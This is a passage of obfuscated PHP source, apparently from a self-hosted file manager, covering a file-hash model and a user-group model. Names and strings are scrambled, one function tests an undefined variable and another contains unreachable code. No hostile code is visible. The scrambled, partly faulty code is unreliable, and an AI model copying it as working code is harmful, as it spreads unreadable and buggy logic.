$á³Ö¯äª->cacheMethod($Õªç¾£[182], $á³Ö¯äª->path, $Õªç¾£[179]); if (IO::size($•°Ùäõş) != $‰¦²¾ò–) { return !1; } $şšß•Ü¡ = KodIO::defaultDriver(); $½„Î’è¥ = array($Õªç¾£[634] => $‰¦²¾ò–, $Õªç¾£[2053] => 1, $Õªç¾£[506] => $ª÷ßŞÇ², $Õªç¾£[903] => $şšß•Ü¡[$Õªç¾£[487]], $Õªç¾£[507] => $Ü¹¡Ë³, $Õªç¾£[2054] => $ùÀÍêöÕ, $Õªç¾£[2055] => $İó÷Õ); return $½„Î’è¥; } public function addFileCheckExist($úÕáÓíˆ, $á•ßûÀ¡, $ãîØ‘é) { $Ôı­ó–Ÿ =& $_SERVER[‹‰”››ê]; $Ñ¼±ƒ¤Ñ = $this->findByHash($úÕáÓíˆ, $á•ßûÀ¡); if (!$Ñ¼±ƒ¤Ñ) { return !1; } $ŸùÜÜ™° = array($Ôı­ó–Ÿ[2053] => intval($Ñ¼±ƒ¤Ñ[$Ôı­ó–Ÿ[2060]]) + 1, $Ôı­ó–Ÿ[634] => $ãîØ‘é); $this->where(array($Ôı­ó–Ÿ[556] => $Ñ¼±ƒ¤Ñ[$Ôı­ó–Ÿ[555]]))->save($ŸùÜÜ™°); return $Ñ¼±ƒ¤Ñ; } public function remove($×ÛÛŒñ) { $this->linkCountChange($×ÛÛŒñ, !1); $this->clearEmpty(); return !0; } public function linkAdd($½Á´ş†ò) { $this->linkCountChange($½Á´ş†ò, !0); } public function linkCountChange($Û›—®š†, $ö×Š…İ¦) { $ş¢´ ğÅ =& $_SERVER[‹‰”››ê]; if (!$Û›—®š†) { return; } if (!is_array($Û›—®š†)) { $Û›—®š† = array($Û›—®š†); } $ˆ®Áğº = array(); foreach ($Û›—®š† as $ú¢şÍÂ”) { $Ã‡š°çå = $ú¢şÍÂ” . $ş¢´ ğÅ[12]; if (!$ˆ®Áğº[$Ã‡š°çå]) { $ˆ®Áğº[$Ã‡š°çå] = 0; } $ˆ®Áğº[$Ã‡š°çå]++; } $™ı¢è”‚ = array(); foreach ($ˆ®Áğº as $ú¢şÍÂ” => $“ú˜ü„€) { $Ã‡š°çå = $“ú˜ü„€ . $ş¢´ ğÅ[12]; if (!$™ı¢è”‚[$Ã‡š°çå]) { $™ı¢è”‚[$Ã‡š°çå] = array(); } $™ı¢è”‚[$Ã‡š°çå][] = $ú¢şÍÂ”; } foreach ($™ı¢è”‚ as $“ú˜ü„€ => $Ëµ©ñ«) { if (!$Ëµ©ñ«) { continue; } $“ú˜ü„€ = $ö×Š…İ¦ ? $“ú˜ü„€ : -intval($“ú˜ü„€); $ÍÅ˜Ô“ã = array($ş¢´ ğÅ[555] => array($ş¢´ ğÅ[7], $Ëµ©ñ«)); if ($“ú˜ü„€ < 0) { $ÍÅ˜Ô“ã[$ş¢´ ğÅ[2060]] = array($ş¢´ ğÅ[1108], abs($“ú˜ü„€)); } $this->where($ÍÅ˜Ô“ã)->setAdd($ş¢´ ğÅ[2060], $“ú˜ü„€); } } public function findByHash($ìÅ ş‘É, $‹¿Æ–¨ = false) { $áªï¢ÛÇ =& $_SERVER[‹‰”››ê]; if (!$ìÅ ş‘É && !$‹¿Æ–¨) { return !1; } $ô­¶Ô²« = array($áªï¢ÛÇ[2054] => $ìÅ ş‘É); if ($‹¿Æ–¨) { $ô­¶Ô²« = array($áªï¢ÛÇ[2055] => $‹¿Æ–¨); } return $this->order($áªï¢ÛÇ[2061])->where($ô­¶Ô²«)->find(); } public function clearEmpty($¬šª‘Ç– = 1) { $üÛãé¾ =& $_SERVER[‹‰”››ê]; $ö®Ö•–‘ = time() - 3600 * 24 * $¬šª‘Ç–; $ìõıŞ÷ = $üÛãé¾[2062] . $ö®Ö•–‘; $ÃûºÆ¶Ä = $this->where($ìõıŞ÷)->select(); if (!$ÃûºÆ¶Ä) { return; } $ô¯ÚÀ¸ = new Task($üÛãé¾[2063], $üÛãé¾[12], count($ÃûºÆ¶Ä)); foreach ($ÃûºÆ¶Ä as $¨ÂÙÔí±) { $ô¯ÚÀ¸->update(1); $this->resetFile($¨ÂÙÔí±); } $ô¯ÚÀ¸->end(); } public function resetFile($ñüŒÏÅø) { $åö“£Áë =& $_SERVER[‹‰”››ê]; $©äôûê = array($åö“£Áë[556] => $ñüŒÏÅø[$åö“£Áë[555]]); $´˜ßèıá = Model($åö“£Áë[1437])->where($©äôûê)->count(); $ü»Õ¸˜ = Model($åö“£Áë[2064])->where($©äôûê)->count(); $ŞÈ÷³²Š = intval($´˜ßèıá) + intval($ü»Õ¸˜); if ($ŞÈ÷³²Š == 0) { IO::remove($ñüŒÏÅø[$åö“£Áë[87]]); Model($åö“£Áë[2065])->delete($ñüŒÏÅø[$åö“£Áë[555]]); $this->where($©äôûê)->delete(); $this->metaSet($ñüŒÏÅø[$åö“£Áë[555]], null, null); write_log(ACTION . $åö“£Áë[2066] . KodUser::id() . $åö“£Áë[2067] . $ñüŒÏÅø[$åö“£Áë[555]] . $åö“£Áë[2068] . $ñüŒÏÅø[$åö“£Áë[79]] . $åö“£Áë[202] . $ñüŒÏÅø[$åö“£Áë[87]], $åö“£Áë[2069]); return; } if ($ñüŒÏÅø[$åö“£Áë[2060]] != $ŞÈ÷³²Š) { $this->where($©äôûê)->save(array($åö“£Áë[2053] => $ŞÈ÷³²Š)); } } public function storageInfo($Ø»·àĞ• = false) { $ã©¨Ÿ¿ß =& $_SERVER[‹‰”››ê]; $Ò§ŠÄÜœ = $this->count() + 0.0; $Ì¹Â½¿ = 0; $ÍÇòÙº = 1; $Ò“º³Š” = 0; $‚›°ÓÃ = 5000; for ($Î•½±¾ = 0; $Î•½±¾ < $Ò§ŠÄÜœ; $Î•½±¾ = $Î•½±¾ + $‚›°ÓÃ) { $ëŸîá€ = $this->limit($Î•½±¾, $Î•½±¾ + $‚›°ÓÃ)->select(); foreach ($ëŸîá€ as $ÁÄğ§›­) { $ÍÇòÙº += $ÁÄğ§›­[$ã©¨Ÿ¿ß[79]] * $ÁÄğ§›­[$ã©¨Ÿ¿ß[2060]]; $Ì¹Â½¿ += $ÁÄğ§›­[$ã©¨Ÿ¿ß[79]] * ($ÁÄğ§›­[$ã©¨Ÿ¿ß[2060]] - 1); $Ò“º³Š” += $ÁÄğ§›­[$ã©¨Ÿ¿ß[2060]]; } } $×¢Ò©¦Ä = array($ã©¨Ÿ¿ß[2070] => $ÍÇòÙº, $ã©¨Ÿ¿ß[2071] => $Ì¹Â½¿, $ã©¨Ÿ¿ß[2072] => $Ì¹Â½¿ / $ÍÇòÙº, $ã©¨Ÿ¿ß[83] => $Ò§ŠÄÜœ, $ã©¨Ÿ¿ß[2073] => $Ò“º³Š”); return $×¢Ò©¦Ä; } } class GroupModel extends ModelBase { protected $tableName = "\x67\162\157\165\160"; protected $tableMeta = array("\164\x61\142\154\x65\x4e\141\x6d\145" => "\x67\x72\x6f\x75\160\x5f\x6d\145\164\141", "\x6d\145\164\x61\x46\151\145\x6c\x64" => "\147\162\x6f\x75\x70\x49\x44"); protected function cacheFunctionAlias($ä÷Â¡ú) { $¡‘Ñö‡Ü =& $_SERVER[‹‰”››ê]; return array($¡‘Ñö‡Ü[2074] => array($ä÷Â¡ú[0], $¡‘Ñö‡Ü[2075]), $¡‘Ñö‡Ü[2076] => array($ä÷Â¡ú[0], $¡‘Ñö‡Ü[2077])); } protected function getInfo($½¥êŸÍ…, $âîÎá•æ = false) { $û‡°ÒÇ = $this->getInfoSimple($½¥êŸÍ…); if (!$û‡°ÒÇ) { return !1; } if ($âîÎá•æ) { return $this->_listDataApplyItem($û‡°ÒÇ); } return $this->cacheFunctionGet($_SERVER[‹‰”››ê][2078], $½¥êŸÍ…); } protected function getInfoSimple($“œ ©Í, $ÔÄµş’™ = false) { $‚äÌÌÃ˜ =& $_SERVER[‹‰”››ê]; if ($ÔÄµş’™) { $›Åé Şü = array($‚äÌÌÃ˜[1992] => intval($“œ ©Í)); $Ì¤€Õõ‡ = $this->where($›Åé Şü)->find(); return is_array($Ì¤€Õõ‡) ? $Ì¤€Õõ‡ : array(); } return $this->cacheFunctionGet($‚äÌÌÃ˜[2079], $“œ ©Í); } protected function groupAdd($åâÉóåã) { $¡íáã³š =& $_SERVER[‹‰”››ê]; if (!$åâÉóåã[$¡íáã³š[193]] && isset($åâÉóåã[$¡íáã³š[1992]]) && $åâÉóåã[$¡íáã³š[1992]] == 1) { if ($»×©Å‚ = $this->getInfoSimple($åâÉóåã[$¡íáã³š[1992]], !0)) { return $åâÉóåã[$¡íáã³š[1992]]; } } else { $»×©Å‚ = $this->getInfoSimple($åâÉóåã[$¡íáã³š[193]]); if (!$»×©Å‚) { return !1; } } $–Ššô¹Û = $¡íáã³š[607]; if ($»×©Å‚[$¡íáã³š[598]]) { $–Ššô¹Û = $»×©Å‚[$¡íáã³š[598]] . $»×©Å‚[$¡íáã³š[1992]] . $¡íáã³š[50]; } $˜ÛâŒÀô = array($¡íáã³š[506] => $this->groupNameAuto($åâÉóåã[$¡íáã³š[193]], $åâÉóåã[$¡íáã³š[32]]), $¡íáã³š[489] => $åâÉóåã[$¡íáã³š[193]], $¡íáã³š[669] => $–Ššô¹Û, $¡íáã³š[2080] => $åâÉóåã[$¡íáã³š[1978]], $¡íáã³š[2081] => 0, $¡íáã³š[1996] => 0); if (isset($åâÉóåã[$¡íáã³š[2016]])) { $˜ÛâŒÀô[$¡íáã³š[2016]] = $åâÉóåã[$¡íáã³š[2016]]; } else { $Ş¡ïÖ¾Î = $this->max($¡íáã³š[2016]); if (!$Ş¡ïÖ¾Î) { $Ş¡ïÖ¾Î = 0; } $˜ÛâŒÀô[$¡íáã³š[2016]] = $Ş¡ïÖ¾Î + 1; } if (!empty($åâÉóåã[$¡íáã³š[1992]])) { $˜ÛâŒÀô[$¡íáã³š[1992]] = $åâÉóåã[$¡íáã³š[1992]]; } $ú°š¾Ø = $this->add($˜ÛâŒÀô); $this->setNamePinyin($ú°š¾Ø, $˜ÛâŒÀô[$¡íáã³š[32]]); if (isset($åâÉóåã[$¡íáã³š[2082]])) { $this->metaSet($ú°š¾Ø, array($¡íáã³š[2082] => $åâÉóåã[$¡íáã³š[2082]], $¡íáã³š[2083] => $åâÉóåã[$¡íáã³š[2083]])); unset($åâÉóåã[$¡íáã³š[2082]]); unset($åâÉóåã[$¡íáã³š[2083]]); } Model($¡íáã³š[1437])->groupRootAdd($ú°š¾Ø); $this->_clearCache($åâÉóåã[$¡íáã³š[193]]); return $ú°š¾Ø; } protected function groupEdit($¯ä’ãÄî, $ß×¨±ùË) { $ºÄĞê¹æ =& $_SERVER[‹‰”››ê]; $ó—×„ù = $this->getInfoSimple($¯ä’ãÄî); if (!$ó—×„ù) { return !1; } if (!empty($ß×¨±ùË[$ºÄĞê¹æ[193]])) { $”‹Ñò¹… = $this->getInfoSimple($ß×¨±ùË[$ºÄĞê¹æ[193]]); if (!$”‹Ñò¹…) { return !1; } if ($ó—×„ù[$ºÄĞê¹æ[1992]] == $”‹Ñò¹…[$ºÄĞê¹æ[1992]]) { return !1; } if ($ß×¨±ùË[$ºÄĞê¹æ[193]] != $ó—×„ù[$ºÄĞê¹æ[193]]) { if ($”‹Ñò¹…[$ºÄĞê¹æ[598]] !== $ó—×„ù[$ºÄĞê¹æ[598]] && strpos($”‹Ñò¹…[$ºÄĞê¹æ[598]], $ó—×„ù[$ºÄĞê¹æ[598]] . $ó—×„ù[$ºÄĞê¹æ[1992]] . $ºÄĞê¹æ[50]) === 0) { return !1; } $ß×¨±ùË[$ºÄĞê¹æ[669]] = $”‹Ñò¹…[$ºÄĞê¹æ[598]] . $ß×¨±ùË[$ºÄĞê¹æ[193]] . $ºÄĞê¹æ[50]; $this->_changeChildLevel($ó—×„ù, $”‹Ñò¹…); $this->_clearCache($”‹Ñò¹…[$ºÄĞê¹æ[1992]]); $this->_clearCache($ó—×„ù[$ºÄĞê¹æ[193]]); } } if (isset($ß×¨±ùË[$ºÄĞê¹æ[32]])) { $this->setNamePinyin($¯ä’ãÄî, $ß×¨±ùË[$ºÄĞê¹æ[32]]); } if (isset($ß×¨±ùË[$ºÄĞê¹æ[2082]])) { $this->metaSet($¯ä’ãÄî, array($ºÄĞê¹æ[2082] => $ß×¨±ùË[$ºÄĞê¹æ[2082]], $ºÄĞê¹æ[2083] => $ß×¨±ùË[$ºÄĞê¹æ[2083]])); unset($ß×¨±ùË[$ºÄĞê¹æ[2082]]); unset($ß×¨±ùË[$ºÄĞê¹æ[2083]]); } $this->_clearChildrenCache($ó—×„ù); return $this->where(array($ºÄĞê¹æ[2084] => $¯ä’ãÄî))->save($ß×¨±ùË); } private function _clearChildrenCache($²üş¼§Â) { $Ğı¨´Ğì =& $_SERVER[‹‰”››ê]; $…³úø° = array($Ğı¨´Ğì[669] => array($Ğı¨´Ğì[629], $²üş¼§Â[$Ğı¨´Ğì[598]] . $²üş¼§Â[$Ğı¨´Ğì[1992]] . $Ğı¨´Ğì[630])); $ÆÚÔÂö = $this->field($Ğı¨´Ğì[1992])->where($…³úø°)->select(); foreach ($ÆÚÔÂö as $¢â†—ŞÕ) { $this->_clearCache($¢â†—ŞÕ[$Ğı¨´Ğì[1992]]); } } private function _clearCache($œõØßÌ¹) { $ïÃÎè¦ =& $_SERVER[‹‰”››ê]; $this->cacheFunctionClear($ïÃÎè¦[2078], $œõØßÌ¹); $this->cacheFunctionClear($ïÃÎè¦[2079], $œõØßÌ¹); } private function _changeChildLevel($´×ã€£¼, $ïÄ”¬“à, $Ã¤ƒÁïÛ = false) { $Û¼ß”äå =& $_SERVER[‹‰”››ê]; $ùú¼˜çâ = $´×ã€£¼[$Û¼ß”äå[598]] . $´×ã€£¼[$Û¼ß”äå[1992]] . $Û¼ß”äå[50]; $Áë ñÒ® = $ïÄ”¬“à[$Û¼ß”äå[598]] . $ïÄ”¬“à[$Û¼ß”äå[1992]] . $Û¼ß”äå[50] . $´×ã€£¼[$Û¼ß”äå[1992]] . $Û¼ß”äå[50]; if ($Ã¤ƒÁïÛ) { $Áë ñÒ® = $ïÄ”¬“à[$Û¼ß”äå[598]] . $ïÄ”¬“à[$Û¼ß”äå[1992]] . $Û¼ß”äå[50]; } $º¸Â†€ù = array($Û¼ß”äå[669] => array($Û¼ß”äå[629], $´×ã€£¼[$Û¼ß”äå[598]] . $´×ã€£¼[$Û¼ß”äå[1992]] . $Û¼ß”äå[630])); $ì¤Ğç = array($Û¼ß”äå[669] => array($Û¼ß”äå[678], "\x72\x65\x70\154\x61\143\145\x28\x70\x61\162\x65\x6e\x74\x4c\x65\166\x65\x6c\54\x27{$ùú¼˜çâ}\x27\54\x27{$Áë ñÒ®}\47\51")); $this->_clearChildrenCache($´×ã€£¼); $this->where($º¸Â†€ù)->data($ì¤Ğç)->save(); } public function setNamePinyin($úÊÍúÚÏ, $ğ–¿³·Ñ = false) { $ø¡Ş¸š° =& $_SERVER[‹‰”››ê]; if (!$ğ–¿³·Ñ) { $µı¸›Å² = $this->getInfoSimple($úÊÍúÚÏ); $ğ–¿³·Ñ = $µı¸›Å²[$ø¡Ş¸š°[32]]; } if (!Input::check($ğ–¿³·Ñ, $ø¡Ş¸š°[672])) { $this->metaSet($úÊÍúÚÏ, $ø¡Ş¸š°[550], null); $this->metaSet($úÊÍúÚÏ, $ø¡Ş¸š°[549], null); return; } $È€ôŒú– = array($ø¡Ş¸š°[550] => str_replace($ø¡Ş¸š°[53], $ø¡Ş¸š°[12], Pinyin::get($ğ–¿³·Ñ)), $ø¡Ş¸š°[549] => Pinyin::get($ğ–¿³·Ñ, $ø¡Ş¸š°[673])); $this->metaSet($úÊÍúÚÏ, $È€ôŒú–); } protected function metaSet($Ô‚ŠéØ, $«Ù“¸ä = null, $Ê†İ…Ñä = null) { $this->_clearCache($Ô‚ŠéØ); return parent::metaSet($Ô‚ŠéØ, $«Ù“¸ä, $Ê†İ…Ñä); } protected function groupStatus($ÉäòÖ¶, $¡Éƒ’úŠ) { $ÙÃÑšõœ =& $_SERVER[‹‰”››ê]; $ÎËûˆòÔ = $this->getInfoSimple($ÉäòÖ¶); if (!$ÎËûˆòÔ) { return !1; } $this->_clearCache($ÉäòÖ¶); return $this->metaSet($ÉäòÖ¶, $ÙÃÑšõœ[840], $¡Éƒ’úŠ); if ($¡Éƒ’úŠ == $ÙÃÑšõœ[91]) { $ã·¥ûøˆ = $this->parentLevelArray($ÎËûˆòÔ[$ÙÃÑšõœ[598]]); } else { } $ã·¥ûøˆ[] = $ÎËûˆòÔ[$ÙÃÑšõœ[1992]]; $Ù›ÒŠ = array(); foreach ($ã·¥ûøˆ as $ÉäòÖ¶) { $Ù›ÒŠ[] = array($ÙÃÑšõœ[1992] => $ÉäòÖ¶, $ÙÃÑšõœ[97] => $ÙÃÑšõœ[840], $ÙÃÑšõœ[462] => $¡Éƒ’úŠ); $this->_clearCache($ÉäòÖ¶); } return Model($ÙÃÑšõœ[2085])->addAll($Ù›ÒŠ, array(), !0); } protected function groupRemove($‘Ç‘»¯´, $¹”²Ä²Ê = false) { $¦„¡€æ  =& $_SERVER[‹‰”››ê]; $ú„¾ÌŒà = array($¦„¡€æ [1992] => $‘Ç‘»¯´); $Ç¯Ëï¡½ = $this->where($ú„¾ÌŒà)->find(); if (!$Ç¯Ëï¡½ || $Ç¯Ëï¡½[$¦„¡€æ [193]] == 0) { return !1; } if (!$¹”²Ä²Ê) { $ñ°—‚õÂ = $this->getInfoSimple($Ç¯Ëï¡½[$¦„¡€æ [193]]); $this->_changeChildLevel($Ç¯Ëï¡½, $ñ°—‚õÂ, !0); $this->where(array($¦„¡€æ [193] => $‘Ç‘»¯´))->save(array($¦„¡€æ [193] => $Ç¯Ëï¡½[$¦„¡€æ [193]])); $this->_clearCache($ñ°—‚õÂ[$¦„¡€æ [1992]]); } Model($¦„¡€æ [2085])->where($ú„¾ÌŒà)->delete(); Model($¦„¡€æ [2086])->where($ú„¾ÌŒà)->delete(); Model($¦„¡€æ [920])->groupRootRemove($‘Ç‘»¯´); $this->_clearCache($Ç¯Ëï¡½[$¦„¡€æ [193]]); return $this->where($ú„¾ÌŒà)->delete(); } protected function groupSort($¼ÙªôÅ) { $»á¾öÏú =& $_SERVER[‹‰”››ê]; $©•Ï‚ = array(); foreach ($¼ÙªôÅ as $öÓˆ¢Ô => $¶ÅÏ±Õæ) { $©•Ï‚[] = array($»á¾öÏú[1992], $¶ÅÏ±Õæ, $»á¾öÏú[2016], $öÓˆ¢Ô + 1); } $this->saveAll($©•Ï‚); } public function listData() { $–ôĞè…œ = $this->_makeOrder()->selectPage(50); $this->_listDataApply($–ôĞè…œ[$_SERVER[‹‰”››ê][457]]); return $–ôĞè…œ; } private function _makeOrder($¡ÊŞÓîù = '') { $ƒ€”âé£ =& $_SERVER[‹‰”››ê]; $©ŠúÚ˜ã = array($ƒ€”âé£[1992], $ƒ€”âé£[32], $ƒ€”âé£[1980], $ƒ€”âé£[234]); $Õ–æ’ú = array($ƒ€”âé£[535] => $ƒ€”âé£[536], $ƒ€”âé£[537] => $ƒ€”âé£[538]); $„ÏËèöğ = Input::get($ƒ€”âé£[542], $ƒ€”âé£[7], $ƒ€”âé£[1996], $©ŠúÚ˜ã); $ÄÎë’‰š = Input::get($ƒ€”âé£[543], $ƒ€”âé£[7], $ƒ€”âé£[2087], array($ƒ€”âé£[2087], $ƒ€”âé£[537])); $ÄÎë’‰š = $Õ–æ’ú[$ÄÎë’‰š]; $¡ÊŞÓîù = $¡ÊŞÓîù . "{$„ÏËèöğ}\40{$ÄÎë’‰š}\x2c\40\x67\162\x6f\x75\160\x49\x44\40\141\x73\x63"; return $this->order($¡ÊŞÓîù); } public function listChild($û­Àƒåé) { $èùê‰¼í =& $_SERVER[‹‰”››ê]; $°§·í = $this->where(array($èùê‰¼í[193] => $û­Àƒåé))->_makeOrder()->selectPage(200); $this->_listDataApply($°§·í[$èùê‰¼í[457]]); return $°§·í; } public function listChildIds($ÌşÕ«‰Ğ) { $­ÂÖÛÏğ =& $_SERVER[‹‰”››ê]; if (is_string($È†×ğî)) { $ÌşÕ«‰Ğ = explode($­ÂÖÛÏğ[50], $ÌşÕ«‰Ğ); } $öÕÒËİ¶ = $this->where(array($­ÂÖÛÏğ[1992] => array($­ÂÖÛÏğ[7], $ÌşÕ«‰Ğ)))->field($­ÂÖÛÏğ[2088])->select(); if (!$öÕÒËİ¶) { return !1; } $ØÊÉ´Âß = array(); foreach ($öÕÒËİ¶ as $ºÒ¬¥š) { $ØÊÉ´Âß[] = "\163\145\154\x65\143\x74\40\x67\162\157\165\160\x49\104\40\146\162\157\x6d\x20\x60\x67\162\x6f\x75\160\140\x20\x77\150\145\x72\x65\x20\x70\141\162\145\156\x74\114\x65\x76\x65\154\40\x6c\x69\x6b\x65\40\47{$ºÒ¬¥š[$­ÂÖÛÏğ[598]]}{$ºÒ¬¥š[$­ÂÖÛÏğ[1992]]}\54\x25\47"; } $ØÊÉ´Âß = implode($­ÂÖÛÏğ[2089], $ØÊÉ´Âß); $öÕÒËİ¶ = $this->query($ØÊÉ´Âß); if (!$öÕÒËİ¶) { return array(); } $ÌşÕ«‰Ğ = array_to_keyvalue($öÕÒËİ¶, $­ÂÖÛÏğ[12], $­ÂÖÛÏğ[1992]); return array_unique($ÌşÕ«‰Ğ); } public function listByID($èÜóÜÛ­) { $°àØ¾  =& $_SERVER[‹‰”››ê]; if (!$èÜóÜÛ­) { return array(); } $Ãô¼ôº = array($°àØ¾ [1992] => array($°àØ¾ [7], $èÜóÜÛ­)); $Öª£ğã• = $this->where($Ãô¼ôº)->select(); $Öª£ğã• = array_sort_keep($Öª£ğã•, $°àØ¾ [1992], $èÜóÜÛ­); $this->_listDataApply($Öª£ğã•); return $Öª£ğã•; } public function listSearch($Å°…İ¤ñ) { $˜Ã†èä =& $_SERVER[‹‰”››ê]; $×ÇÑêÌ = trim($Å°…İ¤ñ[$˜Ã†èä[2090]]); $Ş¥Â©“Ì = explode($˜Ã†èä[53], $×ÇÑêÌ); if (!$×ÇÑêÌ || count($Ş¥Â©“Ì) == 1) { return $this->listSearchNow($Å°…İ¤ñ); } $Ø³ï’Ò´ = array($˜Ã†èä[457] => array()); foreach ($Ş¥Â©“Ì as $ã­³úíõ) { if (!trim($ã­³úíõ)) { continue; } $Å°…İ¤ñ[$˜Ã†èä[2090]] = $ã­³úíõ; $Ô—ä¿ñ = $this->listSearchNow($Å°…İ¤ñ); $Ø³ï’Ò´[$˜Ã†èä[457]] = array_merge($Ø³ï’Ò´[$˜Ã†èä[457]], $Ô—ä¿ñ[$˜Ã†èä[457]]); } $Ø³ï’Ò´[$˜Ã†èä[457]] = array_unique_by_key($Ø³ï’Ò´[$˜Ã†èä[457]], $˜Ã†èä[1992]); $Ø³ï’Ò´[$˜Ã†èä[454]] = array($˜Ã†èä[455] => count($Ø³ï’Ò´[$˜Ã†èä[457]]), $˜Ã†èä[451] => 20, $˜Ã†èä[440] => 1, $˜Ã†èä[456] => 1); return $Ø³ï’Ò´; } public function listSearchNow($îüÍ‡ôÃ) { $ÅËá‚’º =& $_SERVER[‹‰”››ê]; $ß¢İÄ = trim($îüÍ‡ôÃ[$ÅËá‚’º[2090]]); $›Ø·®ñ = isset($îüÍ‡ôÃ[$ÅËá‚’º[2091]]) ? $îüÍ‡ôÃ[$ÅËá‚’º[2091]] : !1; if (!trim($ß¢İÄ)) { return !1; } $ß¢İÄ = str_replace($ÅËá‚’º[2092], $ÅËá‚’º[2093], $ß¢İÄ); $Ñ‚½µÉ = array($ÅËá‚’º[1992] => array($ÅËá‚’º[471], "{$ß¢İÄ}\45"), $ÅËá‚’º[32] => array($ÅËá‚’º[471], "\x25{$ß¢İÄ}\x25"), $ÅËá‚’º[1093] => $ÅËá‚’º[2094]); if ($›Ø·®ñ) { $¢Ù’‰—é = $this->getInfoSimple($›Ø·®ñ); $œÔƒÁ™ = $¢Ù’‰—é[$ÅËá‚’º[598]] . $›Ø·®ñ . $ÅËá‚’º[630]; $Ñ‚½µÉ = array($Ñ‚½µÉ, array($ÅËá‚’º[598] => array($ÅËá‚’º[471], $œÔƒÁ™))); } $Ñ‚½µÉ = $this->parseWhereLike($Ñ‚½µÉ); $ÛçÇÁ½¬ = $this->_makeOrder()->where($Ñ‚½µÉ)->selectPage(20); $ÛçÇÁ½¬ = $ÛçÇÁ½¬ ? $ÛçÇÁ½¬ : array($ÅËá‚’º[457] => array(), $ÅËá‚’º[454] => array()); if (!$ÛçÇÁ½¬ || count($ÛçÇÁ½¬[$ÅËá‚’º[457]]) < 5 && Input::check($ß¢İÄ, $ÅËá‚’º[405])) { $´¿½°æĞ = $this->groupChildrenAll($›Ø·®ñ); $Œ”ó­® = $this->_searchFromMeta($ÅËá‚’º[549], $ß¢İÄ, 10, $´¿½°æĞ); $¬Õ´³ìÎ = $this->_searchFromMeta($ÅËá‚’º[550], $ß¢İÄ, 10, $´¿½°æĞ); $£à×¯İ‰ = array_merge($Œ”ó­®, $¬Õ´³ìÎ, $ÛçÇÁ½¬[$ÅËá‚’º[457]]); $ÛçÇÁ½¬[$ÅËá‚’º[457]] = array_unique_by_key($£à×¯İ‰, $ÅËá‚’º[1992]); $ÛçÇÁ½¬[$ÅËá‚’º[454]][$ÅËá‚’º[455]] = count($ÛçÇÁ½¬[$ÅËá‚’º[457]]); $ÛçÇÁ½¬[$ÅËá‚’º[454]][$ÅËá‚’º[456]] = ceil($ÛçÇÁ½¬[$ÅËá‚’º[454]][$ÅËá‚’º[455]] / $ÛçÇÁ½¬[$ÅËá‚’º[454]][$ÅËá‚’º[451]]); } $this->_listDataApply($ÛçÇÁ½¬[$ÅËá‚’º[457]]); return $ÛçÇÁ½¬; } protected function groupChildrenAll($ºÄÌ²èâ) { $èĞå¶¤¶ =& $_SERVER[‹‰”››ê]; if (!$ºÄÌ²èâ) { return !1; } if (!is_array($ºÄÌ²èâ)) { $ºÄÌ²èâ = array($ºÄÌ²èâ); } $Ä­ï­ = $ºÄÌ²èâ; foreach ($ºÄÌ²èâ as $Ö•µÊİ…) { $Á¶Œ•¹† = $this->getInfoSimple($Ö•µÊİ…); $ÖÁşøÎ¹ = array($èĞå¶¤¶[598] => array($èĞå¶¤¶[471], $Á¶Œ•¹†[$èĞå¶¤¶[598]] . $Ö•µÊİ… . $èĞå¶¤¶[630])); $æŒúó”à = $this->field($èĞå¶¤¶[1992])->where($ÖÁşøÎ¹)->select(); $Ä­ï­ = array_merge($Ä­ï­, array_to_keyvalue($æŒúó”à, $èĞå¶¤¶[12], $èĞå¶¤¶[1992])); } return array_unique($Ä­ï­); } private function _searchFromMeta($Ğ‡»²ŒÊ, $¾†›çÕŠ, $·ä²ı², $½à‹Šø¼) { $¥“Àş–ˆ =& $_SERVER[‹‰”››ê]; $¾†›çÕŠ = strtolower($¾†›çÕŠ); $›´¤‚Ó = array($¥“Àş–ˆ[97] => $Ğ‡»²ŒÊ, $¥“Àş–ˆ[462] => array($¥“Àş–ˆ[471], "\x25{$¾†›çÕŠ}\45")); $›´¤‚Ó = $this->parseWhereLike($›´¤‚Ó); if ($½à‹Šø¼) { $›´¤‚Ó[$¥“Àş–ˆ[1992]] = array($¥“Àş–ˆ[7], $½à‹Šø¼); } $ï²òİÉ = Model($¥“Àş–ˆ[2095])->where($›´¤‚Ó)->limit($·ä²ı²)->select(); if (!$ï²òİÉ) { return array(); } $ï²òİÉ = array_to_keyvalue($ï²òİÉ, $¥“Àş–ˆ[12], $¥“Àş–ˆ[1992]); $Âùø‰„ = $this->where(array($¥“Àş–ˆ[2084] => array($¥“Àş–ˆ[7], $ï²òİÉ)))->select(); if (!$Âùø‰„) { return array(); } return $Âùø‰„; } protected function _listDataApplyItem($ä¡çíıó) { $…ßÑÑß = array($ä¡çíıó); $this->_listDataApply($…ßÑÑß); return $…ßÑÑß[0]; } protected function _listDataApply(&$«˜©—±Ş) { $Şƒöƒåç =& $_SERVER[‹‰”››ê]; if (!$«˜©—±Ş) { return; } $˜ÖÌÖìø = array_to_keyvalue($«˜©—±Ş, $Şƒöƒåç[12], $Şƒöƒåç[1992]); $this->_listAppendChildren($«˜©—±Ş); $this->_listAppendChildrenMember($«˜©—±Ş); $this->_listAppendMeta($«˜©—±Ş, $˜ÖÌÖìø); $this->_listAppendParent($«˜©—±Ş); $this->_listAppendSourceRoot($«˜©—±Ş, $˜ÖÌÖìø); } private function _listAppendChildren(&$¬­àû—Ø) { $ë¹¿Ÿêš =& $_SERVER[‹‰”››ê]; $èäß®ÀÏ = array_to_keyvalue($¬­àû—Ø, $ë¹¿Ÿêš[12], $ë¹¿Ÿêš[1992]); $¥ıÙíæ = array($ë¹¿Ÿêš[193] => array($ë¹¿Ÿêš[7], $èäß®ÀÏ)); $”Î²«á² = array($ë¹¿Ÿêš[193], $ë¹¿Ÿêš[2096] => $ë¹¿Ÿêš[579]); $ÌµËğÓ = $this->field($”Î²«á²)->where($¥ıÙíæ)->group($ë¹¿Ÿêš[193])->select(); $“Ÿ¼·¬Ÿ = array_to_keyvalue($ÌµËğÓ, $ë¹¿Ÿêš[193], $ë¹¿Ÿêš[579]); foreach ($¬­àû—Ø as &$†öâ‰›) { $ô´¦´¤” = $†öâ‰›[$ë¹¿Ÿêš[1992]]; $†öâ‰›[$ë¹¿Ÿêš[2097]] = isset($“Ÿ¼·¬Ÿ[$ô´¦´¤”]) ? intval($“Ÿ¼·¬Ÿ[$ô´¦´¤”]) : !1; } unset($†öâ‰›); } private function _listAppendChildrenMember(&$¦–¤œ ù) { $Æş©°ú =& $_SERVER[‹‰”››ê]; $¥šÄÑõà = array_to_keyvalue($¦–¤œ ù, $Æş©°ú[12], $Æş©°ú[1992]); $ÃŠ²È›¼ = 